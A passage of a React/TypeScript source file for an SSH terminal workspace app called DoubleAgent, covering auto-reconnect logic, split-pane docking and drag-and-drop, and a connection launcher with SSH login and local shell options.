      const nextAttempt = currentAttempt + 1;
      if (nextAttempt <= recState.maxAttempts) {
        reconnectInFlightRef.current.delete(paneId);
        startAutoReconnectRef.current?.(
          {
            id: paneId,
            sessionId: '',
            hostId: recState.hostId,
            title: recState.title,
          },
          recState.tabId,
          nextAttempt,
          errMsg
        );
        return;
      } else {
        setReconnectStates((prev) => {
          const next = new Map(prev);
          next.set(paneId, {
            ...recState,
            attempt: currentAttempt,
            status: 'failed',
            countdown: 0,
            reason: errMsg || 'Maximum reconnect attempts exceeded',
          });
          reconnectStatesRef.current = next;
          return next;
        });
        setStatusMessage(`Auto-reconnect to ${recState.title} failed after ${recState.maxAttempts} attempts.`);
      }
    } finally {
      reconnectInFlightRef.current.delete(paneId);
    }
  };
  performReconnectRef.current = performReconnect;

  const startAutoReconnect = (
    pane: PaneItem,
    tabId: string,
    attempt = 1,
    reason?: string
  ): void => {
    const existing = reconnectTimersRef.current.get(pane.id);
    if (existing) {
      clearInterval(existing);
      reconnectTimersRef.current.delete(pane.id);
    }

    const maxAttempts = globalSettingsRef.current.maxReconnectAttempts || 5;
    const effectiveAttempt = Math.max(1, attempt);
    const delaySec = attempt === 0 ? 0 : Math.min(Math.pow(2, effectiveAttempt), 30);

    const nextState: ReconnectState = {
      paneId: pane.id,
      tabId,
      hostId: pane.hostId,
      title: pane.title,
      attempt: effectiveAttempt,
      maxAttempts,
      countdown: delaySec,
      status: 'reconnecting',
      reason: reason || 'Connection dropped',
    };

    const syncMap = new Map(reconnectStatesRef.current);
    syncMap.set(pane.id, nextState);
    reconnectStatesRef.current = syncMap;
    setReconnectStates(syncMap);

    if (delaySec === 0) {
      void performReconnectRef.current?.(pane.id);
      return;
    }

    let remaining = delaySec;
    const timer = setInterval(() => {
      remaining -= 1;
      if (remaining > 0) {
        setReconnectStates((prev) => {
          const cur = prev.get(pane.id);
          if (!cur) return prev;
          const next = new Map(prev);
          next.set(pane.id, { ...cur, countdown: remaining });
          reconnectStatesRef.current = next;
          return next;
        });
      } else {
        clearInterval(timer);
        reconnectTimersRef.current.delete(pane.id);
        void performReconnectRef.current?.(pane.id);
      }
    }, 1000);

    reconnectTimersRef.current.set(pane.id, timer);
  };
  startAutoReconnectRef.current = startAutoReconnect;

  const handleSplitResizeStart = (
    e: React.MouseEvent,
    tabId: string,
    splitId: string,
    direction: 'horizontal' | 'vertical',
    index: number,
    initialRatios: number[]
  ): void => {
    e.preventDefault();
    e.stopPropagation();
    const parentEl = (e.currentTarget as HTMLElement).parentElement;
    const rect = parentEl?.getBoundingClientRect();
    const containerSize =
      direction === 'horizontal'
        ? rect && rect.width > 0
          ? rect.width
          : 800
        : rect && rect.height > 0
          ? rect.height
          : 500;
    const startPos = direction === 'horizontal' ? e.clientX : e.clientY;
    setActiveSplitResize({
      tabId,
      splitId,
      direction,
      index,
      startPos,
      containerSize,
      initialRatios,
    });

    const handleMouseMove = (moveEvent: MouseEvent): void => {
      const currentPos = direction === 'horizontal' ? moveEvent.clientX : moveEvent.clientY;
      const deltaPx = currentPos - startPos;
      const deltaPct = (deltaPx / Math.max(containerSize, 100)) * 100;
      const nextRatios = [...initialRatios];
      const totalPair = nextRatios[index] + nextRatios[index + 1];
      const minPct = Math.min(12, totalPair * 0.25);
      const updatedA = Math.min(totalPair - minPct, Math.max(minPct, nextRatios[index] + deltaPct));
      const updatedB = totalPair - updatedA;
      nextRatios[index] = Number(updatedA.toFixed(2));
      nextRatios[index + 1] = Number(updatedB.toFixed(2));

      setTabs((prev) =>
        prev.map((t) =>
          t.id === tabId
            ? { ...t, rootNode: updateSplitRatiosInTree(t.rootNode, splitId, nextRatios) }
            : t
        )
      );
    };

    const handleMouseUp = (): void => {
      setActiveSplitResize(null);
      window.removeEventListener('mousemove', handleMouseMove);
      window.removeEventListener('mouseup', handleMouseUp);
      window.dispatchEvent(new Event('resize'));
    };

    window.addEventListener('mousemove', handleMouseMove);
    window.addEventListener('mouseup', handleMouseUp);
  };

  const handleResetSplitRatios = (tabId: string, splitId: string, childCount: number): void => {
    const equal = Array.from({ length: childCount }, () => 100 / childCount);
    setTabs((prev) =>
      prev.map((t) =>
        t.id === tabId
          ? { ...t, rootNode: updateSplitRatiosInTree(t.rootNode, splitId, equal) }
          : t
      )
    );
    setStatusMessage('Reset split pane sizes to equal proportions.');
    window.dispatchEvent(new Event('resize'));
  };

  const handleEqualizeAllSplits = (): void => {
    if (!activeTab) return;
    setTabs((prev) =>
      prev.map((t) =>
        t.id === activeTab.id ? { ...t, rootNode: equalizeAllSplitsInTree(t.rootNode) } : t
      )
    );
    setShowAddToViewMenu(false);
    setStatusMessage('Equalized all split pane sizes in current view.');
    window.dispatchEvent(new Event('resize'));
  };

  const handleConnectHostIntoSplit = async (
    host: HostSummary,
    zone: Exclude<DropZonePosition, 'center'> = 'right',
    targetPaneIdOverride?: string
  ): Promise<void> => {
    if (
      !activeTab ||
      !activePane ||
      activeTab.tabType === 'notes' ||
      activeTab.tabType === 'settings' ||
      activeTab.tabType === 'sftp' ||
      activeTab.tabType === 'network-map' ||
      activeTab.tabType === 'winrm' ||
      activeTab.tabType === 'route-health' ||
      activeTab.tabType === 'api-tester' ||
      activeTab.tabType === 'hex-runner' ||
      activeTab.tabType === 'editor'
    ) {
      await handleConnectSavedHost(host);
      return;
    }

    const targetPaneId = targetPaneIdOverride || activePane.id;
    const api = getWailsBindings();
    let sessionIdToUse = `sess-split-host-${host.id}-${Date.now()}-${Math.floor(Math.random() * 1000)}`;
    if (api?.ConnectSavedHost) {
      setStatusMessage(
        `Connecting to ${host.label} (${host.effectiveUser}@${host.address}:${host.effectivePort}) into split view...`
      );
      try {
        sessionIdToUse = await api.ConnectSavedHost(host.id, { cols: 100, rows: 34 });
        if (host.sessionLogging) {
          setActiveLogSessions((prev) => {
            const next = new Set(prev);
            next.add(sessionIdToUse);
            return next;
          });
          void refreshSessionLogs();
        }
      } catch (err: unknown) {
        const msg = err instanceof Error ? err.message : String(err);
        setStatusMessage(`Split connection failed: ${msg}`);
        return;
      }
    } else if (host.sessionLogging) {
      void handleToggleSessionLog(sessionIdToUse, host.label, host.id);
    }

    tabCounterRef.current += 1;
    const newPaneId = `pane-host-${tabCounterRef.current}`;
    const newPane: WorkspaceNode = {
      type: 'pane',
      id: newPaneId,
      sessionId: sessionIdToUse,
      hostId: host.id,
      title: host.label,
      paneType: 'terminal',
    };

    setTabs((prev) =>
      prev.map((t) => {
        if (t.id !== activeTab.id) return t;
        const updatedRoot = dockNodeInTree(t.rootNode, targetPaneId, newPane, zone);
        return {
          ...t,
          rootNode: updatedRoot,
          activePaneId: newPaneId,
        };
      })
    );
    setShowAddToViewMenu(false);
    setStatusMessage(`Connected ${host.label} side-by-side (${zone}) in current view.`);
    setTimeout(() => focusersRef.current.get(sessionIdToUse)?.(), 50);
  };

  const handleDockToolIntoSplit = async (
    toolType:
      | 'notes'
      | 'totp'
      | 'sftp'
      | 'snippets'
      | 'local-powershell'
      | 'local-cmd'
      | 'local-bash'
      | 'network-map'
      | 'editor',
    zone: Exclude<DropZonePosition, 'center'> = 'right',
    targetPaneIdOverride?: string,
    explicitHostId?: string
  ): Promise<void> => {
    if (
      toolType === 'local-powershell' ||
      toolType === 'local-cmd' ||
      toolType === 'local-bash'
    ) {
      const shellType = toolType.replace('local-', '');
      if (
        !activeTab ||
        !activePane ||
        activeTab.tabType === 'notes' ||
        activeTab.tabType === 'settings' ||
        activeTab.tabType === 'sftp' ||
        activeTab.tabType === 'network-map' ||
        activeTab.tabType === 'winrm' ||
        activeTab.tabType === 'route-health' ||
        activeTab.tabType === 'api-tester' ||
        activeTab.tabType === 'hex-runner'
      ) {
        await handleOpenLocalTerminal(shellType);
        return;
      }
      const api = getWailsBindings();
      let sid = `local-${shellType}-${Date.now()}-${Math.floor(Math.random() * 1000)}`;
      if (api?.OpenLocalTerminal) {
        try {
          sid = await api.OpenLocalTerminal(shellType, { cols: 100, rows: 30 });
        } catch (err: unknown) {
          const msg = err instanceof Error ? err.message : String(err);
          setStatusMessage(`Local terminal failed: ${msg}`);
          return;
        }
      }
      const labelMap: Record<string, string> = {
        powershell: 'Local (PowerShell)',
        cmd: 'Local (CMD)',
        bash: 'Local (Bash)',
      };
      tabCounterRef.current += 1;
      const newPaneId = `pane-local-${tabCounterRef.current}`;
      const newPane: WorkspaceNode = {
        type: 'pane',
        id: newPaneId,
        sessionId: sid,
        title: labelMap[shellType] || `Local (${shellType})`,
        paneType: 'terminal',
      };
      const targetId = targetPaneIdOverride || activePane.id;
      setTabs((prev) =>
        prev.map((t) =>
          t.id === activeTab.id
            ? {
              ...t,
              rootNode: dockNodeInTree(t.rootNode, targetId, newPane, zone),
              activePaneId: newPaneId,
            }
            : t
        )
      );
      setShowAddToViewMenu(false);
      setStatusMessage(`Docked ${newPane.title} (${zone}) in current view.`);
      setTimeout(() => focusersRef.current.get(sid)?.(), 50);
      return;
    }

    const hostId = explicitHostId || activePane?.hostId || activeTab?.hostId;
    const hostObj = vaultSummary.hosts.find((h) => h.id === hostId);
    const hostLabel = hostObj?.label || hostObj?.address || (hostId ? 'Host' : 'Workspace');

    tabCounterRef.current += 1;
    let newPane: WorkspaceNode;
    if (toolType === 'notes') {
      const newPaneId = `pane-notes-${tabCounterRef.current}`;
      newPane = {
        type: 'pane',
        id: newPaneId,
        sessionId: `notes-sess-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
        hostId,
        title: `Notes: ${hostLabel}`,
        paneType: 'notes',
        notesHostId: hostId,
      };
      setOpenNotesDrawerHostId(null);
    } else if (toolType === 'totp') {
      const newPaneId = `pane-totp-${tabCounterRef.current}`;
      newPane = {
        type: 'pane',
        id: newPaneId,
        sessionId: `totp-sess-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
        hostId,
        title: '2FA / TOTP Authenticator',
        paneType: 'totp',
      };
      setShowTotpModal(false);
    } else if (toolType === 'snippets') {
      const newPaneId = `pane-snippets-${tabCounterRef.current}`;
      newPane = {
        type: 'pane',
        id: newPaneId,
        sessionId: `snippets-sess-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
        hostId,
        title: 'Command Snippets',
        paneType: 'snippets',
      };
      setShowSnippetsModal(false);
    } else if (toolType === 'network-map') {
      const newPaneId = `pane-netmap-${tabCounterRef.current}`;
      newPane = {
        type: 'pane',
        id: newPaneId,
        sessionId: `netmap-pane-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
        title: 'Network Topology Map',
        paneType: 'network-map',
      };
    } else {
      const newPaneId = `pane-sftp-${tabCounterRef.current}`;
      const sftpSid =
        activePane && (!activePane.paneType || activePane.paneType === 'terminal')
          ? activePane.sessionId
          : `sftp-preview-${Date.now()}`;
      newPane = {
        type: 'pane',
        id: newPaneId,
        sessionId: `sftp-pane-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
        sftpSessionId: sftpSid,
        hostId,
        title: `SFTP: ${hostLabel}`,
        paneType: 'sftp',
      };
    }

    if (
      !activeTab ||
      !activePane ||
      activeTab.tabType === 'notes' ||
      activeTab.tabType === 'settings' ||
      activeTab.tabType === 'sftp' ||
      activeTab.tabType === 'network-map' ||
      activeTab.tabType === 'winrm' ||
      activeTab.tabType === 'route-health' ||
      activeTab.tabType === 'api-tester' ||
      activeTab.tabType === 'hex-runner' ||
      activeTab.tabType === 'editor'
    ) {
      tabCounterRef.current += 1;
      const newTabId = `tab-view-${tabCounterRef.current}`;
      const newTab: TabItem = {
        id: newTabId,
        title: newPane.title,
        hostId,
        color: 'var(--accent-primary)',
        rootNode: newPane,
        activePaneId: newPane.id,
        tabType: 'terminal',
      };
      setTabs((prev) => [...prev, newTab]);
      setActiveTabId(newTabId);
      setShowAddToViewMenu(false);
      setStatusMessage(`Opened ${newPane.title} in workspace view.`);
      return;
    }

    const targetId = targetPaneIdOverride || activePane.id;
    setTabs((prev) =>
      prev.map((t) =>
        t.id === activeTab.id
          ? {
            ...t,
            rootNode: dockNodeInTree(t.rootNode, targetId, newPane, zone),
            activePaneId: newPane.id,
          }
          : t
      )
    );
    setShowAddToViewMenu(false);
    setStatusMessage(`Docked ${newPane.title} (${zone}) in current view.`);
  };

  const handleUndockPaneToTab = (tabId: string, paneId: string): void => {
    const sourceTab = tabs.find((t) => t.id === tabId);
    if (!sourceTab) return;
    const panes = collectPanes(sourceTab.rootNode);
    if (panes.length <= 1) return;
    const paneNode = findPaneNode(sourceTab.rootNode, paneId);
    if (!paneNode) return;

    const updatedSourceRoot = removePaneFromTree(sourceTab.rootNode, paneId);
    if (!updatedSourceRoot) return;

    tabCounterRef.current += 1;
    const newTabId = `tab-undock-${tabCounterRef.current}`;
    const newTab: TabItem = {
      id: newTabId,
      title: paneNode.title,
      hostId: paneNode.hostId,
      color: getEffectiveHostColor(paneNode.hostId, undefined, paneNode.title),
      rootNode: paneNode,
      activePaneId: paneNode.id,
      tabType: paneNode.paneType === 'editor' ? 'editor' : 'terminal',
      editSessionId: paneNode.editSessionId,
      editRemotePath: paneNode.editRemotePath,
    };

    setTabs((prev) => {
      const next: TabItem[] = [];
      for (const t of prev) {
        if (t.id === tabId) {
          const rem = collectPanes(updatedSourceRoot);
          next.push({
            ...t,
            rootNode: updatedSourceRoot,
            activePaneId: rem.some((p) => p.id === t.activePaneId)
              ? t.activePaneId
              : rem[0]?.id || '',
          });
        } else {
          next.push(t);
        }
      }
      next.push(newTab);
      return next;
    });
    setActiveTabId(newTabId);
    setStatusMessage(`Undocked "${paneNode.title}" into its own tab.`);
  };

  const handleMergeTabIntoSplit = (
    sourceTabId: string,
    targetTabId: string,
    targetPaneId: string,
    zone: Exclude<DropZonePosition, 'center'>
  ): void => {
    if (sourceTabId === targetTabId) return;
    const sourceTab = tabs.find((t) => t.id === sourceTabId);
    const targetTab = tabs.find((t) => t.id === targetTabId);
    if (!sourceTab || !targetTab) return;

    const sourcePanes = collectPanes(sourceTab.rootNode);
    const firstSourcePaneId = sourcePanes[0]?.id || targetTab.activePaneId;

    setTabs((prev) => {
      const next: TabItem[] = [];
      for (const t of prev) {
        if (t.id === sourceTabId) {
          continue;
        }
        if (t.id === targetTabId) {
          const mergedRoot = dockNodeInTree(t.rootNode, targetPaneId, sourceTab.rootNode, zone);
          next.push({
            ...t,
            rootNode: mergedRoot,
            activePaneId: firstSourcePaneId,
          });
        } else {
          next.push(t);
        }
      }
      return next;
    });
    setActiveTabId(targetTabId);
    setStatusMessage(`Merged tab "${sourceTab.title}" (${zone}) into "${targetTab.title}".`);
  };

  const getDropZoneFromEvent = (
    e: React.DragEvent,
    isSameTabPane: boolean
  ): DropZonePosition => {
    const rect = (e.currentTarget as HTMLElement).getBoundingClientRect();
    if (rect.width > 0 && rect.height > 0) {
      const relX = (e.clientX - rect.left) / rect.width;
      const relY = (e.clientY - rect.top) / rect.height;
      const distLeft = relX;
      const distRight = 1 - relX;
      const distTop = relY;
      const distBottom = 1 - relY;
      const minEdge = Math.min(distLeft, distRight, distTop, distBottom);
      if (minEdge < 0.28) {
        if (minEdge === distLeft) return 'left';
        if (minEdge === distRight) return 'right';
        if (minEdge === distTop) return 'top';
        return 'bottom';
      }
      return isSameTabPane ? 'center' : 'right';
    }
    return isSameTabPane ? 'center' : 'right';
  };

  const handleExecuteDropOnPane = (
    tab: TabItem,
    targetPaneId: string,
    explicitZone?: DropZonePosition
  ): void => {
    const dragPayload = workspaceDragRef.current || workspaceDragItem;
    if (!dragPayload) return;

    const isSameTabPane = dragPayload.type === 'pane' && dragPayload.tabId === tab.id;
    const zone: DropZonePosition =
      explicitZone ||
      (dropTargetIndicator?.paneId === targetPaneId ? dropTargetIndicator.zone : undefined) ||
      (isSameTabPane ? 'center' : 'right');

    startWorkspaceDrag(null);

    if (dragPayload.type === 'pane') {
      if (dragPayload.tabId === tab.id) {
        if (dragPayload.paneId === targetPaneId) return;
        setTabs((prev) =>
          prev.map((t) =>
            t.id === tab.id
              ? {
                ...t,
                rootNode: movePaneInTree(t.rootNode, dragPayload.paneId, targetPaneId, zone),
                activePaneId: dragPayload.paneId,
              }
              : t
          )
        );
        setStatusMessage(
          zone === 'center'
            ? `Swapped "${dragPayload.title}" with target pane.`
            : `Moved "${dragPayload.title}" to ${zone} split.`
        );
      } else {
        const sourceTab = tabs.find((t) => t.id === dragPayload.tabId);
        const sourceNode = sourceTab ? findPaneNode(sourceTab.rootNode, dragPayload.paneId) : null;
        if (!sourceTab || !sourceNode) return;
        const effectiveZone: Exclude<DropZonePosition, 'center'> =
          zone === 'center' ? 'right' : zone;
        setTabs((prev) => {
          const next: TabItem[] = [];
          for (const t of prev) {
            if (t.id === sourceTab.id) {
              const remRoot = removePaneFromTree(t.rootNode, dragPayload.paneId);
              if (remRoot) {
                const remPanes = collectPanes(remRoot);
                next.push({
                  ...t,
                  rootNode: remRoot,
                  activePaneId: remPanes[0]?.id || '',
                });
              }
            } else if (t.id === tab.id) {
              next.push({
                ...t,
                rootNode: dockNodeInTree(t.rootNode, targetPaneId, sourceNode, effectiveZone),
                activePaneId: sourceNode.id,
              });
            } else {
              next.push(t);
            }
          }
          return next;
        });
        setActiveTabId(tab.id);
        setStatusMessage(`Docked "${dragPayload.title}" (${effectiveZone}) into current view.`);
      }
      return;
    }

    if (dragPayload.type === 'tab') {
      const effectiveZone: Exclude<DropZonePosition, 'center'> =
        zone === 'center' ? 'right' : zone;
      handleMergeTabIntoSplit(dragPayload.tabId, tab.id, targetPaneId, effectiveZone);
      return;
    }

    if (dragPayload.type === 'host') {
      const hostObj = vaultSummary.hosts.find((h) => h.id === dragPayload.hostId);
      if (hostObj) {
        const effectiveZone: Exclude<DropZonePosition, 'center'> =
          zone === 'center' ? 'right' : zone;
        void handleConnectHostIntoSplit(hostObj, effectiveZone, targetPaneId);
      }
      return;
    }

    if (dragPayload.type === 'tool') {
      const effectiveZone: Exclude<DropZonePosition, 'center'> =
        zone === 'center' ? 'right' : zone;
      void handleDockToolIntoSplit(
        dragPayload.toolType,
        effectiveZone,
        targetPaneId,
        dragPayload.hostId
      );
    }
  };

  const renderPaneDropOverlay = (
    tab: TabItem,
    node: Extract<WorkspaceNode, { type: 'pane' }>
  ): React.JSX.Element | null => {
    const activeDrag = workspaceDragItem || workspaceDragRef.current;
    if (!activeDrag) return null;
    if (activeDrag.type === 'pane' && activeDrag.paneId === node.id) return null;

    const isSameTabPane = activeDrag.type === 'pane' && activeDrag.tabId === tab.id;
    const activeZone =
      dropTargetIndicator?.paneId === node.id ? dropTargetIndicator.zone : null;

    const zoneButtons: { zone: DropZonePosition; label: string; icon: string }[] = [
      { zone: 'top', label: `Dock Top on ${node.title}`, icon: 'Top' },
      { zone: 'left', label: `Dock Left on ${node.title}`, icon: 'Left' },
      {
        zone: 'center',
        label: isSameTabPane ? `Swap with ${node.title}` : `Dock Center on ${node.title}`,
        icon: isSameTabPane ? 'Swap' : 'Dock',
      },
      { zone: 'right', label: `Dock Right on ${node.title}`, icon: 'Right' },
      { zone: 'bottom', label: `Dock Bottom on ${node.title}`, icon: 'Bottom' },
    ];

    return (
      <div className="pane-drop-overlay" aria-label={`Drop Zones for ${node.title}`}>
        {activeZone && (
          <div className={`pane-snap-highlight snap-${activeZone}`}>
            <span className="pane-snap-badge">
              {activeZone === 'center' && isSameTabPane
                ? `Swap with ${node.title}`
                : `Snap ${activeZone.toUpperCase()} — ${activeDrag.type === 'host' ? activeDrag.label : activeDrag.title}`}
            </span>
          </div>
        )}
        <div className="pane-snap-compass">
          {zoneButtons.map((zb) => (
            <button
              key={zb.zone}
              type="button"
              className={`snap-compass-btn compass-${zb.zone} ${activeZone === zb.zone ? 'active' : ''}`}
              aria-label={zb.label}
              onDragOver={(e) => {
                e.preventDefault();
                e.stopPropagation();
                if (dropTargetIndicator?.paneId !== node.id || dropTargetIndicator?.zone !== zb.zone) {
                  setDropTargetIndicator({ paneId: node.id, zone: zb.zone });
                }
              }}
              onDrop={(e) => {
                e.preventDefault();
                e.stopPropagation();
                handleExecuteDropOnPane(tab, node.id, zb.zone);
              }}
              onClick={(e) => {
                e.stopPropagation();
                handleExecuteDropOnPane(tab, node.id, zb.zone);
              }}
            >
              {zb.icon}
            </button>
          ))}
        </div>
      </div>
    );
  };

  const renderNewConnectionLauncher = (launcherCtx?: {
    tabId: string;
    paneId: string;
    isPrimary: boolean;
  }): React.JSX.Element => {
    const isPrimary = launcherCtx ? launcherCtx.isPrimary : true;
    const labelSuffix = isPrimary ? '' : ` (${launcherCtx?.paneId})`;
    const armLauncherTarget = () => {
      if (launcherCtx) {
        targetLauncherRef.current = { tabId: launcherCtx.tabId, paneId: launcherCtx.paneId };
        setActiveTabId(launcherCtx.tabId);
        setTabs((prev) =>
          prev.map((t) =>
            t.id === launcherCtx.tabId ? { ...t, activePaneId: launcherCtx.paneId } : t
          )
        );
      } else {
        targetLauncherRef.current = null;
      }
    };

    return (
      <div className={`empty-state-card ${launcherCtx ? 'is-pane-launcher-card' : ''}`}>
        <div className="empty-state-header">
          <img src={appLogo} alt="DoubleAgent" className="empty-state-brand-img" />
          <div className="empty-state-header-text">
            <h2>{launcherCtx ? 'New Connection' : 'DoubleAgent Terminal Workspace'}</h2>
            <p>
              {launcherCtx
                ? 'Connect via Direct SSH, launch a local shell, or pick a saved host for this pane.'
                : 'Direct SSH, local shells, and multi-pane workspace launcher.'}
            </p>
          </div>
        </div>

        {/* Direct SSH Connection Bar moved from top-right header into New Connection view */}
        <div className="launcher-direct-connect-panel">
          <div className="launcher-direct-connect-header">
            <div className="launcher-direct-connect-label">
              <CyberIcon name="terminal" size={13} />
              <span>Direct SSH Connection</span>
            </div>
            <div className="launcher-auth-toggle-group" role="radiogroup" aria-label="Authentication Method">
              <button
                type="button"
                className={`auth-toggle-pill ${directAuthMethod === 'password' ? 'active' : ''}`}
                onClick={() => setDirectAuthMethod('password')}
                title="Authenticate with Password"
              >
                <CyberIcon name="key" size={11} />
                <span>Password</span>
              </button>
              <button
                type="button"
                className={`auth-toggle-pill ${directAuthMethod === 'key' ? 'active' : ''}`}
                onClick={() => {
                  setDirectAuthMethod('key');
                  const availableKeys = vaultSummary.keys ?? [];
                  if (!directKeyId && availableKeys.length > 0) {
                    setDirectKeyId(availableKeys[0].id);
                  }
                }}
                title="Authenticate with SSH Key from Keychain"
              >
                <CyberIcon name="bolt" size={11} />
                <span>SSH Key</span>
              </button>
              <button
                type="button"
                className={`auth-toggle-pill ${directAuthMethod === 'agent' ? 'active' : ''}`}
                onClick={() => setDirectAuthMethod('agent')}
                title="Authenticate with OS SSH Agent / Pageant"
              >
                <CyberIcon name="shield" size={11} />
                <span>Agent</span>
              </button>
            </div>
          </div>
          <form
            className={`launcher-direct-form ${quickConnectExpanded ? 'is-focused' : ''}`}
            onSubmit={(e) => {
              armLauncherTarget();
              void handleConnect(e);
            }}
          >
            <div className="launcher-target-deck">
              <span className="quick-connect-prefix" title="Direct SSH Quick Connect">
                <CyberIcon name="terminal" size={13} />
                <span>SSH</span>
              </span>
              <input
                ref={isPrimary ? quickConnectInputRef : undefined}
                className="qc-user-input"
                aria-label={`Username${labelSuffix}`}
                placeholder="user"
                value={username}
                onFocus={() => setQuickConnectExpanded(true)}
                onChange={(e) => setUsername(e.target.value)}
                required
              />
              <span className="qc-sep">@</span>
              <input
                className="qc-host-input"
                aria-label={`Host Address${labelSuffix}`}
                placeholder="host / IP (or user@host:port)"
                value={address}
                onFocus={() => setQuickConnectExpanded(true)}
                onChange={(e) => {
                  const val = e.target.value;
                  const match = val.match(/^([^@\s]+)@([^:\s]+)(?::(\d+))?$/);
                  if (match) {
                    setUsername(match[1]);
                    setAddress(match[2]);
                    if (match[3]) setPort(match[3]);
                  } else {
                    setAddress(val);
                  }
                }}
                required
              />
              <span className="qc-sep">:</span>
              <input
                aria-label={`Port${labelSuffix}`}
                className="port-input qc-port-input"
                placeholder="22"
                value={port}
                onFocus={() => setQuickConnectExpanded(true)}
                onChange={(e) => setPort(e.target.value)}
                required
              />
            </div>

            <div className="launcher-auth-deck">
              {directAuthMethod === 'password' && (
                <input
                  className="qc-pass-input"
                  aria-label={`Password${labelSuffix}`}
                  type="password"
                  placeholder="Password (opt)"
                  value={password}
                  onFocus={() => setQuickConnectExpanded(true)}
                  onChange={(e) => setPassword(e.target.value)}
                />
              )}
              {directAuthMethod === 'key' && (
                <div className="qc-key-deck">
                  <select
                    className="qc-key-select"
                    aria-label={`SSH Key${labelSuffix}`}
                    value={directKeyId}
                    onChange={(e) => setDirectKeyId(e.target.value)}
                    required
                  >
                    <option value="">Select Key from Keychain...</option>
                    {(vaultSummary.keys || []).map((k) => (
                      <option key={k.id} value={k.id}>
                        {k.label} ({k.type} · {k.fingerprint})
                      </option>
                    ))}
                    {(vaultSummary.keys || []).length === 0 && (
                      <option value="" disabled>
                        No keys in Keychain (+ Add in Tools &gt; Keychain)
                      </option>
                    )}
                  </select>
                  <input
                    className="qc-key-pass-input"
                    aria-label={`Key Passphrase${labelSuffix}`}
                    type="password"
                    placeholder="Passphrase (opt)"
                    value={directKeyPassphrase}
                    onChange={(e) => setDirectKeyPassphrase(e.target.value)}
                  />
                </div>
              )}
              {directAuthMethod === 'agent' && (
                <div className="qc-agent-deck" title="Will authenticate using OS OpenSSH Agent or Pageant">
                  <CyberIcon name="shield" size={12} />
                  <span>OS Agent (Pageant / Pipe)</span>
                </div>
              )}
              <button
                type="submit"
                className="btn-primary btn-sm qc-submit-btn"
                aria-label={`Connect SSH${labelSuffix}`}
              >
                Connect SSH
              </button>
            </div>
          </form>
        </div>

        <div className="empty-state-grid">
          <div className="empty-state-section">
            <h3>
              <CyberIcon name="terminal" size={14} /> Local Shells
            </h3>
            <div className="empty-state-actions">
              <button
                type="button"
                className="btn-primary"
                onClick={() => {
                  armLauncherTarget();
                  void handleOpenLocalTerminal('powershell');
                }}
              >
                <CyberIcon name="bolt" size={13} />
                <span>PowerShell</span>
              </button>
              <button
                type="button"
                className="btn-secondary"
                onClick={() => {
                  armLauncherTarget();
                  void handleOpenLocalTerminal('cmd');
                }}
              >
                <CyberIcon name="terminal" size={13} />
                <span>Command Prompt</span>
              </button>
              <button
                type="button"
                className="btn-secondary"
                onClick={() => {
                  armLauncherTarget();
                  void handleOpenLocalTerminal('wsl');
                }}
              >
                <CyberIcon name="terminal" size={13} />
                <span>WSL Linux</span>
              </button>
            </div>
          </div>

          <div className="empty-state-section">
            <h3>
              <CyberIcon name="folder" size={14} /> Terminal Directory Spawning
            </h3>
            <div className="empty-state-actions">
              <button
                type="button"
                className="btn-secondary"
                onClick={() => {
                  armLauncherTarget();
                  void handleOpenTerminalDirectory('default');
                }}
                title="Open local terminal in default working directory"
              >
                <CyberIcon name="home" size={13} />
                <span>Default Directory</span>
              </button>
              <button
                type="button"
                className="btn-secondary"
                onClick={() => {
                  armLauncherTarget();
                  void handleOpenTerminalDirectory('current');
                }}
                title="Open terminal in chosen folder"
              >
                <CyberIcon name="folder" size={13} />
                <span>Choose Folder...</span>
              </button>
              <button
                type="button"
                className="btn-secondary"
                onClick={() => {
                  armLauncherTarget();
                  void handleOpenTerminalDirectory('root');
                }}
                title="Open elevated root / admin shell"
              >
                <CyberIcon name="bolt" size={13} />
                <span>Root / Admin</span>
              </button>
            </div>
          </div>

          <div className="empty-state-section">
            <h3>
              <CyberIcon name="serial" size={14} /> Remote &amp; Serial
            </h3>
            <div className="empty-state-actions">
              <button
                type="button"
                className="btn-secondary"
                onClick={() => {
                  armLauncherTarget();
                  setShowCommandPalette(true);
                }}
              >
                <CyberIcon name="search" size={13} />
                <span>Quick Connect / Hosts (Ctrl+K)</span>
              </button>
              <button
                type="button"
                className="btn-secondary"
                onClick={() => {
                  armLauncherTarget();
                  setShowAddHostModal(true);
                }}
              >
                <CyberIcon name="plus" size={13} />
                <span>New SSH Host</span>
              </button>
              <button
                type="button"
                className="btn-secondary"
                onClick={() => {
                  armLauncherTarget();
                  void handleOpenSerialModal();
                }}
              >
                <CyberIcon name="serial" size={13} />
                <span>Hardware Serial / COM</span>
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  };

  const renderWorkspaceNode = (
    node: WorkspaceNode,
    tab: TabItem,
    totalPanes: number
  ): React.JSX.Element => {
    if (node.type === 'pane') {
      const isPaneActive = node.id === tab.activePaneId;
      const isDragSource =
        workspaceDragItem?.type === 'pane' && workspaceDragItem.paneId === node.id;

      const commonPaneDragEvents = {
        onDragOver: (e: React.DragEvent) => {
          const dragPayload = workspaceDragRef.current || workspaceDragItem;
          if (!dragPayload) return;
          if (dragPayload.type === 'pane' && dragPayload.paneId === node.id) return;
          e.preventDefault();
          e.stopPropagation();
          const isSameTab = dragPayload.type === 'pane' && dragPayload.tabId === tab.id;
          const detectedZone = getDropZoneFromEvent(e, isSameTab);
          if (
            dropTargetIndicator?.paneId !== node.id ||
            dropTargetIndicator?.zone !== detectedZone
          ) {
            setDropTargetIndicator({ paneId: node.id, zone: detectedZone });
          }
        },
        onDrop: (e: React.DragEvent) => {
          e.preventDefault();
          e.stopPropagation();
          handleExecuteDropOnPane(tab, node.id);
        },
      };

      if (node.paneType === 'launcher') {
        const allTabLauncherPanes = collectPanes(tab.rootNode).filter(
          (p) => p.paneType === 'launcher'
        );
        const primaryLauncherId =
          allTabLauncherPanes.find((p) => p.id === tab.activePaneId)?.id ||
          allTabLauncherPanes[0]?.id;
        const isPrimaryLauncher = tab.id === activeTab?.id && node.id === primaryLauncherId;
        return (
          <div
            key={node.id}
            className={`split-pane split-launcher-pane ${isPaneActive ? 'active' : ''} ${isDragSource ? 'is-dragging-pane' : ''}`}
            aria-label={`Pane ${node.title}`}
            {...commonPaneDragEvents}
            onClick={() => {
              setTabs((prev) =>
